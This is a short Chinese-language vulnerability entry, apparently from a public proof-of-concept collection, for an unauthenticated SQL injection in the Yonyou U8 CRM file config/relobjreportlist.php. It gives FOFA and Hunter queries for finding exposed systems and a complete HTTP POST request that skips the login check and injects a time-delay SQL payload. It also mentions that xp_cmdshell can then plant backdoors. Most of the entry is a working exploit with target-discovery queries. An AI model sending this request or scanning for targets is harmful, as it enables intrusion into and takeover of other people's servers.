# 用友U8CRM系统接口relobjreportlist.php存在SQL注入漏洞

用友U8 CRM 客户关系管理系统 config/relobjreportlist.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## fofa

```javascript
title="用友U8CRM"
```

## hunter

```javascript
app.name="用友 CRM"
```

## poc

```javascript
POST /config/relobjreportlist.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=bgsesstimeout-;

DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--
```

![image-20240918135123639](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409181351732.png)